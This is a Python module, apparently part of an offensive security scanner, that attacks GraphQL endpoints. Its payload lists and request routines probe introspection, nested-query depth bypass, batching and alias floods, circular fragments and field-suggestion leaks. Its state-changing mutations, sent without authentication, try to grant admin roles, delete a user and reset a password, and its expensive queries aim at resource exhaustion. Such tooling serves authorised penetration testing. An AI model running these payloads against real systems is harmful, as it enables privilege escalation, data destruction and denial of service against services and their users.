"""GraphQL Depth Limit Bypass — test for depth limiting bypass, batching, alias attacks."""

import httpx
from .http_guard import GuardedAsyncClient
import urllib.parse
import json
import time
from typing import Optional


INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType { name kind }
        }
        args {
          name
          type { name kind ofType { name kind } }
        }
      }
    }
    directives { name locations args { name type { name } } }
  }
}
"""


def _build_nested_query(field_names: list[str], depth: int, alias: str = "") -> str:
    parts = []
    for i, fname in enumerate(field_names):
        padding = "  " * i
        alias_str = f"{alias}_{i}" if alias else fname
        if i < len(field_names) - 1:
            parts.append(f"{padding}{alias_str}: {fname} {{")
        else:
            parts.append(f"{padding}{alias_str}: {fname}")
    for i in range(len(field_names) - 1, -1, -1):
        parts.append(f"{'  ' * i}}}")
    return "\n".join(parts)


def _build_deeply_nested(field_name: str, depth: int) -> str:
    parts = []
    for i in range(depth):
        parts.append(f"{'  ' * i}{field_name} {{")
    parts.append(f"{'  ' * depth}__typename")
    for i in range(depth - 1, -1, -1):
        parts.append(f"{'  ' * i}}}")
    return "\n".join(parts)


def _build_alias_batch(query_body: str, count: int) -> str:
    aliases = []
    for i in range(count):
        aliases.append(f"a{i}: {query_body}")
    return "\n".join(aliases)


def _build_query_batch(queries: list[str]) -> list:
    return [{"query": q} for q in queries]


DIRECTIVE_PAYLOADS = [
    '__typename',
    'id',
    'name',
    'email',
    'role',
    'password',
    'token',
    'secret',
    'admin',
    'phoneNumber',
    'address',
    'creditCard',
    'ssn',
    'internalId',
    'api_key',
]

FRAGMENT_ABUSE_QUERIES = [
    "fragment A on Query { a: __typename ...B } fragment B on Query { b: __typename ...A }",
    "fragment A on __Type { name fields { type { name ...A } } }",
    "{ ...A } fragment A on Query { users { __typename posts { __typename comments { __typename } } } }",
]

INCLUDE_SKIP_PAYLOADS = [
    ('@include(if: true)', True),
    ('@skip(if: false)', True),
    ('@include(if: 1)', True),
    ('@skip(if: 0)', True),
    ('@include(if: "true")', True),
    ('@skip(if: null)', True),
]

MUTATION_ABUSE_QUERIES = [
    "mutation { updateUser(input: {role: \"admin\"}) { id role } }",
    "mutation { deleteUser(id: 1) { success } }",
    "mutation { createAdmin(email: \"test@test.com\", password: \"pass\") { token } }",
    "mutation { updateSettings(key: \"admin\", value: \"true\") { success } }",
    "mutation { resetPassword(userId: 1, newPassword: \"hacked\") { success } }",
    "mutation { assignRole(userId: 1, role: ADMIN) { id } }",
    "mutation { __schema { queryType { name } } }",
    "mutation { internalMutation { secret } }",
]

SUBSCRIPTION_ENUM_PAYLOADS = [
    "subscription { userCreated { id email } }",
    "subscription { messageSent { content from to } }",
    "subscription { adminAction { type target } }",
    "subscription { debugEvent { payload } }",
    "subscription { __typename }",
    "subscription { onUserUpdate { id role } }",
]

FIELD_SUGGESTION_PAYLOADS = [
    "{ usre { id } }",
    "{ useri { id } }",
    "{ user { idd } }",
    "{ user { id } usre { id } }",
    "{ __schema { types { name } } __type(name: \"User\") { fields { name } } }",
]

RESOURCE_EXHAUSTION_QUERIES = [
    "{ users { posts { comments { author { posts { comments { author { name } } } } } } } }",
    "{ __schema { types { fields { type { fields { type { name } } } } } } }",
    "{ users { friends { friends { friends { friends { name } } } } } }",
    "{ products { reviews { author { products { reviews { text } } } } } }",
    "{ users { posts { tags { posts { author { name } } } } } }",
]

TYPE_CONFUSION_PAYLOADS = [
    "{ __type(name: \"User\") { kind fields { name type { name } } } }",
    "{ __type(name: \"Admin\") { kind fields { name } } }",
    "{ __type(name: \"Query\") { possibleTypes { name } } }",
    "{ __type(name: \"Mutation\") { possibleTypes { name } } }",
    "{ __type(name: \"InternalType\") { kind } }",
]


async def _introspect(client: httpx.AsyncClient, target: str) -> Optional[dict]:
    try:
        resp = await client.post(target, json={"query": INTROSPECTION_QUERY}, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if "data" in data and data["data"] and "__schema" in data["data"]:
                return data["data"]["__schema"]
    except Exception:
        pass
    return None


async def _detect_endpoint(client: httpx.AsyncClient, target: str) -> Optional[str]:
    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    paths = [parsed.path, "/graphql", "/api/graphql", "/graphiql", "/v1/graphql", "/v2/graphql", "/gql"]
    seen = set()
    for path in paths:
        if path in seen:
            continue
        seen.add(path)
        url = base + path
        for payload in [
            {"query": "{ __typename }"},
            {"query": "query { __typename }", "operationName": "query"},
        ]:
            try:
                resp = await client.post(url, json=payload, timeout=10)
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        if "data" in data or "errors" in data:
                            return url
                    except Exception:
                        pass
            except Exception:
                continue
    return None


async def _test_depth_bypass(client: httpx.AsyncClient, endpoint: str) -> list[dict]:
    findings = []
    for depth in [10, 20, 50, 100, 500]:
        query = _build_deeply_nested("__typename", depth)
        try:
            start = time.time()
            resp = await client.post(endpoint, json={"query": query}, timeout=30)
            elapsed = time.time() - start
            body = resp.json()
            if resp.status_code == 200:
                if "data" in body:
                    findings.append({
                        "risk": "CRITICAL" if depth >= 50 else "HIGH",
                        "confidence": "confirmed",
                        "technique": "depth_limit_bypass",
                        "evidence": f"Depth {depth} accepted in {elapsed:.2f}s, response: {json.dumps(body)[:200]}",
                        "depth_tested": depth,
                        "response_time": elapsed,
                    })
                elif "errors" in body:
                    err_msg = str(body.get("errors", ""))
                    if "depth" in err_msg.lower() or "limit" in err_msg.lower():
                        findings.append({
                            "risk": "LOW",
                            "confidence": "confirmed",
                            "technique": "depth_limit_enforced",
                            "evidence": f"Depth limit enforced at depth {depth}: {err_msg[:200]}",
                            "depth_tested": depth,
                        })
                    else:
                        findings.append({
                            "risk": "MEDIUM",
                            "confidence": "possible",
                            "technique": "depth_bypass_error_other",
                            "evidence": f"Depth {depth} error (not depth-related): {err_msg[:200]}",
                            "depth_tested": depth,
                        })
            elif resp.status_code == 429:
                findings.append({
                    "risk": "LOW",
                    "confidence": "confirmed",
                    "technique": "rate_limited",
                    "evidence": f"Rate limited at depth {depth}",
                    "depth_tested": depth,
                })
            elif resp.status_code == 500:
                findings.append({
                    "risk": "MEDIUM",
                    "confidence": "possible",
                    "technique": "depth_cause_error",
                    "evidence": f"Server error (500) at depth {depth}: {resp.text[:200]}",
                    "depth_tested": depth,
                })
        except Exception as e:
            if "timeout" in str(e).lower():
                findings.append({
                    "risk": "HIGH",
                    "confidence": "confirmed",
                    "technique": "depth_resource_exhaustion",
                    "evidence": f"Timeout at depth {depth} — server unable to handle nested query",
                    "depth_tested": depth,
                })
            else:
                findings.append({
                    "risk": "INFO",
                    "confidence": "none",
                    "technique": "depth_bypass_error",
                    "evidence": f"Error at depth {depth}: {str(e)[:150]}",
                    "depth_tested": depth,
                })
            break
    return findings


async def _test_batching(client: httpx.AsyncClient, endpoint: str) -> list[dict]:
    findings = []
    single_query = "{ __typename }"
    batch_sizes = [2, 5, 10, 20, 50]
    for size in batch_sizes:
        batch = _build_query_batch([single_query] * size)
        try:
            start = time.time()
            resp = await client.post(endpoint, json=batch, timeout=30)
            elapsed = time.time() - start
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, list) and len(data) >= size:
                    findings.append({
                        "risk": "CRITICAL" if size >= 10 else "HIGH",
                        "confidence": "confirmed",
                        "technique": "query_batching",
                        "evidence": f"Batch of {size} queries executed in {elapsed:.2f}s, {len(data)} responses",
                        "batch_size": size,
                        "response_time": elapsed,
                    })
                elif isinstance(data, dict) and "errors" in data:
                    err_msg = str(data.get("errors", ""))
                    if "batch" in err_msg.lower() or "array" in err_msg.lower():
                        findings.append({
                            "risk": "INFO",
                            "confidence": "confirmed",
                            "technique": "batching_disabled",
                            "evidence": f"Batching rejected: {err_msg[:200]}",
                            "batch_size": size,
                        })
                        break
        except httpx.TimeoutException:
            findings.append({
                "risk": "HIGH",
                "confidence": "confirmed",
                "technique": "batch_resource_exhaustion",
                "evidence": f"Batch of {size} caused timeout — resource exhaustion possible",
                "batch_size": size,
            })
            break
        except Exception as e:
            findings.append({
                "risk": "INFO",
                "confidence": "none",
                "technique": "batch_error",
                "evidence": f"Batch error at size {size}: {str(e)[:150]}",
                "batch_size": size,
            })
            break
    return findings


async def _test_alias_batching(client: httpx.AsyncClient, endpoint: str) -> list[dict]:
    findings = []
    alias_counts = [10, 25, 50, 100, 200]
    for count in alias_counts:
        query = _build_alias_batch("__typename", count)
        full_query = f"query {{ {query} }}"
        try:
            start = time.time()
            resp = await client.post(endpoint, json={"query": full_query}, timeout=30)
            elapsed = time.time() - start
            body = resp.json()
            if resp.status_code == 200 and "data" in body:
                data_keys = list(body["data"].keys()) if body["data"] else []
                findings.append({
                    "risk": "CRITICAL" if count >= 50 else "HIGH",
                    "confidence": "confirmed",
                    "technique": "alias_batching",
                    "evidence": f"Alias batch of {count} executed in {elapsed:.2f}s, {len(data_keys)} aliases resolved",
                    "alias_count": count,
                    "response_time": elapsed,
                })
            elif "errors" in body:
                err_msg = str(body.get("errors", ""))
                if "alias" in err_msg.lower() or "limit" in err_msg.lower():
                    findings.append({
                        "risk": "INFO",
                        "confidence": "confirmed",
                        "technique": "alias_limit_enforced",
                        "evidence": f"Alias limit enforced at {count}: {err_msg[:200]}",
                        "alias_count": count,
                    })
                    break
        except httpx.TimeoutException:
            findings.append({
                "risk": "HIGH",
                "confidence": "confirmed",
                "technique": "alias_resource_exhaustion",
                "evidence": f"Alias batch of {count} caused timeout",
                "alias_count": count,
            })
            break
        except Exception as e:
            findings.append({
                "risk": "INFO",
                "confidence": "none",
                "technique": "alias_error",
                "evidence": f"Alias batch error at {count}: {str(e)[:150]}",
                "alias_count": count,
            })
            break
    return findings


async def _test_circular_fragments(client: httpx.AsyncClient, endpoint: str) -> list[dict]:
    findings = []
    for query in FRAGMENT_ABUSE_QUERIES:
        try:
            start = time.time()
            resp = await client.post(endpoint, json={"query": query}, timeout=15)
            elapsed = time.time() - start
            body = resp.json()
            if resp.status_code == 200 and "data" in body and body["data"]:
                findings.append({
                    "risk": "HIGH",
                    "confidence": "confirmed",
                    "technique": "circular_fragment_abuse",
                    "evidence": f"Circular fragment accepted in {elapsed:.2f}s: {query[:120]}",
                    "response_time": elapsed,
                })
            elif "errors" in body:
                err_msg = str(body.get("errors", ""))
                if "circular" in err_msg.lower() or "cycle" in err_msg.lower() or "fragment" in err_msg.lower():
                    findings.append({
                        "risk": "INFO",
                        "confidence": "confirmed",
                        "technique": "circular_fragment_blocked",
                        "evidence": f"Circular fragment detected: {err_msg[:200]}",
                    })
                elif "429" in err_msg or "rate" in err_msg.lower():
                    break
        except httpx.TimeoutException:
            findings.append({
                "risk": "HIGH",
                "confidence": "confirmed",
                "technique": "circular_fragment_dos",
                "evidence": f"Circular fragment caused timeout: {query[:120]}",
            })
        except Exception:
            pass
    return findings


async def _test_directives(client: httpx.AsyncClient, endpoint: str) -> list[dict]:
    findings = []
    for directive, _ in INCLUDE_SKIP_PAYLOADS:
        for field in DIRECTIVE_PAYLOADS[:10]:
            query = f"query {{ {field} {directive} }}"
            try:
                resp = await client.post(endpoint, json={"query": query}, timeout=10)
                body = resp.json()
                if resp.status_code == 200:
                    if "data" in body and body["data"] and body["data"].get(field) is not None:
                        findings.append({
                            "risk": "HIGH",
                            "confidence": "confirmed",
                            "technique": "directive_bypass",
                            "evidence": f"Directive {directive} exposed field {field}: {json.dumps(body['data'])[:200]}",
                        })
                    elif "errors" in body:
                        err = str(body.get("errors", ""))
                        if "directive" in err.lower() and ("unknown" in err.lower() or "invalid" in err.lower()):
                            continue
            except Exception:
                break
    return findings


async def _test_mutations(client: httpx.AsyncClient, endpoint: str) -> list[dict]:
    findings = []
    for query in MUTATION_ABUSE_QUERIES:
        try:
            resp = await client.post(endpoint, json={"query": query}, timeout=10)
            body = resp.json()
            if resp.status_code == 200:
                if "data" in body and body["data"]:
                    result = body["data"]
                    if any(v is not None for v in (result.values() if isinstance(result, dict) else [result])):
                        findings.append({
                            "risk": "CRITICAL",
                            "confidence": "confirmed",
                            "technique": "mutation_permission_bypass",
                            "evidence": f"Mutation succeeded without auth: {query[:120]}, data: {json.dumps(result)[:200]}",
                        })
                elif "errors" in body:
                    err_msg = str(body.get("errors", ""))
                    if "not found" in err_msg.lower() or "does not exist" in err_msg.lower():
                        findings.append({
                            "risk": "MEDIUM",
                            "confidence": "possible",
                            "technique": "mutation_exists_unauthed",
                            "evidence": f"Mutation field exists but returned error: {err_msg[:200]}",
                        })
                    elif "unauthorized" in err_msg.lower() or "permission" in err_msg.lower() or "auth" in err_msg.lower():
                        findings.append({
                            "risk": "INFO",
                            "confidence": "confirmed",
                            "technique": "mutation_auth_enforced",
                            "evidence": f"Mutation requires auth: {err_msg[:200]}",
                        })
        except Exception:
            pass
    return findings


async def _test_subscriptions(client: httpx.AsyncClient, endpoint: str) -> list[dict]:
    findings = []
    for query in SUBSCRIPTION_ENUM_PAYLOADS:
        try:
            resp = await client.post(endpoint, json={"query": query}, timeout=10)
            body = resp.json()
            if resp.status_code == 200 and "errors" in body:
                err_msg = str(body.get("errors", ""))
                if "subscription" in err_msg.lower() and ("not support" in err_msg.lower() or "not found" in err_msg.lower()):
                    continue
                elif "subscription" in err_msg.lower():
                    findings.append({
                        "risk": "MEDIUM",
                        "confidence": "possible",
                        "technique": "subscription_field_exists",
                        "evidence": f"Subscription field exists: {err_msg[:200]}",
                    })
            elif resp.status_code == 200 and "data" in body and body["data"]:
                findings.append({
                    "risk": "HIGH",
                    "confidence": "confirmed",
                    "technique": "subscription_enumeration",
                    "evidence": f"Subscription query returned data: {json.dumps(body['data'])[:200]}",
                })
        except Exception:
            pass
    return findings


async def _test_field_suggestions(client: httpx.AsyncClient, endpoint: str) -> list[dict]:
    findings = []
    for query in FIELD_SUGGESTION_PAYLOADS:
        try:
            resp = await client.post(endpoint, json={"query": query}, timeout=10)
            body = resp.json()
            if "errors" in body:
                for error in body.get("errors", []):
                    msg = error.get("message", "")
                    suggestions = error.get("extensions", {}).get("suggestions", [])
                    if suggestions:
                        findings.append({
                            "risk": "MEDIUM",
                            "confidence": "confirmed",
                            "technique": "field_suggestion_leak",
                            "evidence": f"Field suggestions leaked: {suggestions}",
                        })
                    elif "did you mean" in msg.lower() or "did you mean" in str(error).lower():
                        findings.append({
                            "risk": "MEDIUM",
                            "confidence": "confirmed",
                            "technique": "field_suggestion_leak",
                            "evidence": f"Field suggestion in error: {msg[:200]}",
                        })
        except Exception:
            pass
    return findings


async def _test_type_confusion(client: httpx.AsyncClient, endpoint: str) -> list[dict]:
    findings = []
    for query in TYPE_CONFUSION_PAYLOADS:
        try:
            resp = await client.post(endpoint, json={"query": query}, timeout=10)
            body = resp.json()
            if resp.status_code == 200 and "data" in body:
                data = body["data"]
                type_info = data.get("__type") if data else None
                if type_info:
                    findings.append({
                        "risk": "MEDIUM",
                        "confidence": "confirmed",
                        "technique": "type_introspection",
                        "evidence": f"Type info leaked: {json.dumps(type_info)[:300]}",
                    })
        except Exception:
            pass
    return findings


async def _test_resource_exhaustion(client: httpx.AsyncClient, endpoint: str) -> list[dict]:
    findings = []
    for query in RESOURCE_EXHAUSTION_QUERIES:
        try:
            start = time.time()
            resp = await client.post(endpoint, json={"query": query}, timeout=30)
            elapsed = time.time() - start
            body = resp.json()
            if resp.status_code == 200 and "data" in body:
                findings.append({
                    "risk": "HIGH" if elapsed > 2 else "MEDIUM",
                    "confidence": "confirmed",
                    "technique": "resource_exhaustion",
                    "evidence": f"Expensive query completed in {elapsed:.2f}s",
                    "response_time": elapsed,
                })
            elif resp.status_code == 500:
                findings.append({
                    "risk": "MEDIUM",
                    "confidence": "possible",
                    "technique": "resource_exhaustion_error",
                    "evidence": f"Expensive query caused 500 in {elapsed:.2f}s: {resp.text[:200]}",
                    "response_time": elapsed,
                })
        except httpx.TimeoutException:
            findings.append({
                "risk": "HIGH",
                "confidence": "confirmed",
                "technique": "resource_exhaustion_timeout",
                "evidence": "Expensive query caused timeout — potential DoS vector",
            })
        except Exception:
            pass
    return findings


async def graphql_depth_bypass(target: str) -> dict:
    """GraphQL Depth Limit Bypass — test for depth limiting bypass, batching, alias attacks.

    Args:
        target: Target URL (e.g., https://example.com/graphql)

    Returns:
        dict with findings, risk, and evidence
    """
    parsed = urllib.parse.urlparse(target)
    if not parsed.scheme:
        target = "http://" + target
        parsed = urllib.parse.urlparse(target)

    base_url = f"{parsed.scheme}://{parsed.netloc}"
    all_findings = []
    endpoint = target

    async with GuardedAsyncClient(
        verify=False,
        follow_redirects=True,
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json",
        },
    ) as client:
        detected_endpoint = await _detect_endpoint(client, target)
        if detected_endpoint:
            endpoint = detected_endpoint
            all_findings.append({
                "risk": "INFO",
                "confidence": "confirmed",
                "technique": "endpoint_detection",
                "evidence": f"GraphQL endpoint detected: {endpoint}",
            })

        schema = await _introspect(client, endpoint)
        if schema:
            types = [t["name"] for t in schema.get("types", []) if not t["name"].startswith("__")]
            query_type = schema.get("queryType", {}).get("name", "Query")
            mutation_type = schema.get("mutationType", {}).get("name") if schema.get("mutationType") else None
            subscription_type = schema.get("subscriptionType", {}).get("name") if schema.get("subscriptionType") else None
            all_findings.append({
                "risk": "MEDIUM",
                "confidence": "confirmed",
                "technique": "introspection_enabled",
                "evidence": f"Schema introspection enabled. Types: {types[:20]}, Query: {query_type}, Mutation: {mutation_type}, Subscription: {subscription_type}",
                "schema_types": types[:30],
                "query_type": query_type,
                "mutation_type": mutation_type,
                "subscription_type": subscription_type,
            })
        else:
            all_findings.append({
                "risk": "INFO",
                "confidence": "none",
                "technique": "introspection_disabled",
                "evidence": "Introspection not available or disabled",
            })

        depth_findings = await _test_depth_bypass(client, endpoint)
        all_findings.extend(depth_findings)

        batch_findings = await _test_batching(client, endpoint)
        all_findings.extend(batch_findings)

        alias_findings = await _test_alias_batching(client, endpoint)
        all_findings.extend(alias_findings)

        fragment_findings = await _test_circular_fragments(client, endpoint)
        all_findings.extend(fragment_findings)

        directive_findings = await _test_directives(client, endpoint)
        all_findings.extend(directive_findings)

        mutation_findings = await _test_mutations(client, endpoint)
        all_findings.extend(mutation_findings)

        subscription_findings = await _test_subscriptions(client, endpoint)
        all_findings.extend(subscription_findings)

        suggestion_findings = await _test_field_suggestions(client, endpoint)
        all_findings.extend(suggestion_findings)

        type_findings = await _test_type_confusion(client, endpoint)
        all_findings.extend(type_findings)

        resource_findings = await _test_resource_exhaustion(client, endpoint)
        all_findings.extend(resource_findings)

    risk_weights = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}
    max_risk = "INFO"
    for f in all_findings:
        r = f.get("risk", "INFO")
        if risk_weights.get(r, 0) > risk_weights.get(max_risk, 0):
            max_risk = r

    confirmed_count = sum(1 for f in all_findings if f.get("confidence") == "confirmed")
    techniques_tested = list(set(f.get("technique", "") for f in all_findings))

    return {
        "target": target,
        "endpoint": endpoint,
        "risk": max_risk,
        "total_findings": len(all_findings),
        "confirmed_findings": confirmed_count,
        "techniques_tested": techniques_tested,
        "findings": all_findings,
        "summary": {
            "introspection": any(f["technique"] == "introspection_enabled" for f in all_findings),
            "depth_bypass": any(f["technique"] == "depth_limit_bypass" for f in all_findings),
            "batching_works": any(f["technique"] == "query_batching" for f in all_findings),
            "alias_bypass": any(f["technique"] == "alias_batching" for f in all_findings),
            "mutation_bypass": any(f["technique"] == "mutation_permission_bypass" for f in all_findings),
            "resource_exhaustion": any("exhaustion" in f["technique"] for f in all_findings),
        },
    }
